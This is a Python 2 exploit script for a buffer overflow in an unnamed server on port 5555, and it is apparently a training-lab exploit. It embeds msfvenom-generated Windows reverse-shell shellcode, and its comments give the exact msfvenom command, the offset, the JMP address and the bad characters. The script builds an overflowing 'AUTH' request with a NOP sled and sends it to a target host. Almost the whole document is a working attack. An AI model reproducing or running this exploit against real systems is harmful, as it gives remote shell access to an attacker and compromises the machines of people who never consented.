#!/usr/bin/python

### Exploiting BufferOverflow vulnerability in a 
### server running on port 5555
### to generate shell code use msfvenom.
###  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00"
### Total lenght 1420 bytes
### shell code length 351 bytes
### bad char "\x00"
### Jmp address "\x6d\xc8\x56\x6c"

import time, struct, sys
import socket as so

shell = ("\xda\xd3\xbb\x17\xf3\x5d\x59\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x13\x03\x4d\xe0\xbf\xac\x8d\xee\xc2"
"\x4f\x6d\xef\xa2\xc6\x88\xde\xe2\xbd\xd9\x71\xd3\xb6\x8f\x7d"
"\x98\x9b\x3b\xf5\xec\x33\x4c\xbe\x5b\x62\x63\x3f\xf7\x56\xe2"
"\xc3\x0a\x8b\xc4\xfa\xc4\xde\x05\x3a\x38\x12\x57\x93\x36\x81"
"\x47\x90\x03\x1a\xec\xea\x82\x1a\x11\xba\xa5\x0b\x84\xb0\xff"
"\x8b\x27\x14\x74\x82\x3f\x79\xb1\x5c\xb4\x49\x4d\x5f\x1c\x80"
"\xae\xcc\x61\x2c\x5d\x0c\xa6\x8b\xbe\x7b\xde\xef\x43\x7c\x25"
"\x8d\x9f\x09\xbd\x35\x6b\xa9\x19\xc7\xb8\x2c\xea\xcb\x75\x3a"
"\xb4\xcf\x88\xef\xcf\xf4\x01\x0e\x1f\x7d\x51\x35\xbb\x25\x01"
"\x54\x9a\x83\xe4\x69\xfc\x6b\x58\xcc\x77\x81\x8d\x7d\xda\xce"
"\x62\x4c\xe4\x0e\xed\xc7\x97\x3c\xb2\x73\x3f\x0d\x3b\x5a\xb8"
"\x72\x16\x1a\x56\x8d\x99\x5b\x7f\x4a\xcd\x0b\x17\x7b\x6e\xc0"
"\xe7\x84\xbb\x47\xb7\x2a\x14\x28\x67\x8b\xc4\xc0\x6d\x04\x3a"
"\xf0\x8e\xce\x53\x9b\x75\x99\x51\x57\x75\x24\x0e\x65\x75\xd7"
"\x75\xe0\x93\xbd\x99\xa5\x0c\x2a\x03\xec\xc6\xcb\xcc\x3a\xa3"
"\xcc\x47\xc9\x54\x82\xaf\xa4\x46\x73\x40\xf3\x34\xd2\x5f\x29"
"\x50\xb8\xf2\xb6\xa0\xb7\xee\x60\xf7\x90\xc1\x78\x9d\x0c\x7b"
"\xd3\x83\xcc\x1d\x1c\x07\x0b\xde\xa3\x86\xde\x5a\x80\x98\x26"
"\x62\x8c\xcc\xf6\x35\x5a\xba\xb0\xef\x2c\x14\x6b\x43\xe7\xf0"
"\xea\xaf\x38\x86\xf2\xe5\xce\x66\x42\x50\x97\x99\x6b\x34\x1f"
"\xe2\x91\xa4\xe0\x39\x12\xc4\x02\xeb\x6f\x6d\x9b\x7e\xd2\xf0"
"\x1c\x55\x11\x0d\x9f\x5f\xea\xea\xbf\x2a\xef\xb7\x07\xc7\x9d"
"\xa8\xed\xe7\x32\xc8\x27")

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1040 + "\x6d\xc8\x56\x6c" + "\x90"*16 + shell +"\x43"*(1420-1040-4-16-351)
s = so.socket(so.AF_INET, so.SOCK_STREAM)

try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
